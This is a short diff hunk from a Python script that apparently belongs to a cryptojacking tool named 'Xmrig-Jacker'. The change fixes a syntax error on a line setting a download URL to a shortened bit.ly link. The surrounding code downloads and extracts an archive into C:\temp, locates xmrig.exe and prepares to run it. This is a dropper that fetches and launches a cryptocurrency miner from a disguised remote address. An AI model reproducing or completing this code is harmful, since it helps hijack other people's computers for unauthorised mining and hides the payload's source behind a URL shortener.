@@ -13,7 +13,7 @@ def main():
     temp_dir = "C:\temp"
     xmrig_path = os.path.join(temp_dir, "Xmrig-Jacker-main", "xmrig", "xmrig.exe")
 
-    download_url = 'https://bit.ly/444WCb3'1
+    download_url = 'https://bit.ly/444WCb3'
     download_and_extract(download_url, temp_dir)
 
     action = f'"{xmrig_path}"'
